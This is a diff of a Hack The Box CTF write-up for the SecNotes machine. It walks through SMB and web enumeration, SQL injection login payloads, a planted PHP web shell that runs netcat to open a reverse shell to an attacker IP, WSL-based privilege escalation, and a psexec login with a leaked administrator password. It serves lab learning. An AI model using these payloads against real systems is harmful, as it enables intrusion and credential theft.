@@ -1,5 +1,5 @@
 # SecNotes [HTB](https://app.hackthebox.com/machines/SecNotes)
-![secnotes-01]()
+![secnotes-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/secnotes-01.png)
 
 ## Recon
 
@@ -7,7 +7,7 @@ Lets scan the target with `nmap`:
 
 `nmap -sC -sV -p- -A 10.129.102.215 -oN nmap.result`
 
-![nmap-res-02]()
+![nmap-res-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/nmap-res-02.png)
 
 We have the following:
 
@@ -27,7 +27,7 @@ Lets try gathering user inforamtion with a null session using `crackmapexec`.
 
 `crackmapexec smb 10.129.102.215 -u '' -p '' --users`
 
-![crackmapexec-null-fail-03]()
+![crackmapexec-null-fail-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/crackmapexec-null-fail-03.png)
 
 
 The target seems to be running Windows 10, null sessions are not allowed though. We wont get in
@@ -36,7 +36,7 @@ without credetials. Lets try the IPC$ share:
 `smbclient -U '%' -N \\\\10.129.102.215\\IPC$`
 
 
-![smbclient-null-fail-04]()
+![smbclient-null-fail-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/smbclient-null-fail-04.png)
 
 
 Seems like the SMB is not the way forward at the moment. Lets take a look at the IIS server. 
@@ -48,17 +48,17 @@ Seems like the SMB is not the way forward at the moment. Lets take a look at the
 
 Lets start by adding `secnotes.htb` to our `/etc/hosts` file:
 
-![hosts-05]()
+![hosts-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/hosts-05.png)
 
 
 Lets open our browser and navigate towards `http://secnotes.htb/`:
 
-![login-form-06]()
+![login-form-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/login%3Dform-06.png)
 
 
 We are prompted for credentials, we also have a signup form. Lets try a few diffrent payloads for the login page. Maybe default credentials like `admin:admin`?, simple SQLi payloads like `' OR 1=1;--`: 
 
-![login-fail-07]()
+![login-fail-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/login-fail-07.png)
 
 
 Maybe there is hidden content somewhere, lets try directory busting:
@@ -66,24 +66,24 @@ Maybe there is hidden content somewhere, lets try directory busting:
 `ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3
 -medium.txt:FUZZ -u http://http://secnotes.htb/FUZZ`
 
-![ffuf-fail-08]()
+![ffuf-fail-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/ffuf-fail-08.png)
 
 
 This yielded nothing. lets try subdomain enumeration? 
 
 `wfuzz -c -f sub-fighter -Z -w /usr/share/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://secnotes.htb' -H 'Host: FUZZ.secnotes.htb' --hw 0`
 
-![wfuzz-fail-09]()
+![wfuzz-fail-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/wfuzz-fail-09.png)
 
 
 We have zero leads at the moment. Lets create an account and see where this leads us.
 
-![create-account-10]()
+![create-account-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/create-account-10.png)
 
 
 We get redirected to a home page: 
 
-![home-page-11]()
+![home-page-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/home-page-11.png)
 
 
 I think the message at the top is a hint towards an indirect object reference vulnerability.
@@ -92,17 +92,17 @@ We also get a possible username on the machine in `tyler`.
 
 Lets add a note:
 
-![add-note-12]()
+![add-note-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/add-note-12.png)
 
  
 You are presented with the note in our home page, and we have a button to delete the note:
 
-![del-note-13]()
+![del-note-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/del-note-13.png)
 
 
 It's a link to `/home.php?action=delete&id=11"`, we can see this more clearly in Burp:
 
-![burp-14]()
+![burp-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/burp-14.png)
 
 
 But the `action` parameter is for `delete`, and we want to see other user's notes, 
@@ -125,22 +125,22 @@ when we login.
 What if we create an account with an SQL statement as the username to load all notes in the 
 database? for example `' OR 1 OR'`:
 
-![malicios-login-15]()
+![malicios-login-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/malicios-login-15.png)
 
 
 Now when we login we can see all the notes in the database: 
 
-![all-notes-16]()
+![all-notes-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/all-notes-16.png)
 
 
 Looks like credetials for an SMB share. Lets try them out:
 
-![smb-conn-17]()
+![smb-conn-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/smb-conn-17.png)
 
 
 It looks like the root of the IIS server on port 8808, Can we write files to this share? 
 
-![upload-test-18]()
+![upload-test-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/upload-test-18.png)
 
 
 Yes we can. Next logical step is to upload a reverse shell script. At first i tried `.aspx`,
@@ -160,7 +160,7 @@ The `nc.exe` on Kali is at `/usr/share/windows-resources/binaries/nc.exe`.
 
 I will rename it to `iisstart.exe` and put it on the SMB share:
 
-![upload-nc-19]()
+![upload-nc-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/upload-nc-19.png)
 
 
 Now we need a `iisstart.php` script we can trigger via the URL that will execute the `nc`.
@@ -174,7 +174,7 @@ system('iisstart.exe -e cmd.exe 10.10.14.68 9001')
 
 Put this on the SMB also: 
 
-![upload-php-20]()
+![upload-php-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/upload-php-20.png)
 
 
 Start the listener `nc -lnvp 9001`. 
@@ -183,7 +183,7 @@ Navigate to `http://secnotes.htb:8808/iisstart.php`
 
 And get a shell:
 
-![shell-21]()
+![shell-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/shell-21.png)
 
 
 
@@ -191,7 +191,7 @@ And get a shell:
 
 If we take a look at tyler's home directroy, we can see a `bash.lnk`:
 
-![home-dir-22]()
+![home-dir-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/home-dir-22.png)
 
 
 We might have `wsl` on this machine. This is important because with root privileges `wsl` allows
@@ -203,19 +203,19 @@ Lets find the `bash` binary on the system:
 `where /R c:\windows bash.exe`
 
 
-![bash-location-23]()
+![bash-location-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/bash-location-23.png)
 
 
 Lets execute it, get into a shell, and use `python -c 'import pty; pty.spawn("/bin/sh")'` to 
 spwan a TTY shell:
 
-![bash-tty-24]()
+![bash-tty-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/bash-tty-24.png)
 
 
 
 If we simply run `history` to try and snatch quick wins: 
 
-![history-25]()
+![history-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/history-25.png)
 
 
 Looks like the Administrator's password. Lets try `psexec`:
@@ -223,4 +223,4 @@ Looks like the Administrator's password. Lets try `psexec`:
 `impacket-psexec administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.129.189.209`
 
 
-![root-25]()
+![root-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/SecNotes/img/root-25.png)
